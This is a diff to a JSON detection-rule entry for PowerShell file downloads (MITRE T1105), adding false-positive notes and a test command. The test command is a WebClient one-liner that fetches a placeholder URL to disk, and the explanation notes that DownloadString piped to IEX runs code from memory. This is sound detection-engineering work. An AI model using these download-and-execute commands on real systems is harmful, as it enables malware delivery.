@@ -126,7 +126,8 @@
           "T1105"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -140,7 +141,8 @@
         "confidence": "medium",
         "log_ids": [
           "1"
-        ]
+        ],
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -151,7 +153,8 @@
           "T1105"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "sigma",
@@ -162,7 +165,8 @@
           "T1105"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "elastic",
@@ -172,7 +176,9 @@
         "attack": [
           "T1105"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -204,7 +210,8 @@
         "Review PowerShell Script Block / Module Logs, Sysmon, Web proxy logs for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "(New-Object Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\out.ps1')"
     }
   },
   "explain": "Downloads a file on Windows with PowerShell's WebClient:\n  New-Object Net.WebClient   create the client\n  .DownloadFile('<url>','C:\\Users\\Public\\out.ps1')   fetch <url> and write it to disk\nSaves the file locally; swap DownloadFile for DownloadString piped to IEX to run a script from memory with no disk write."
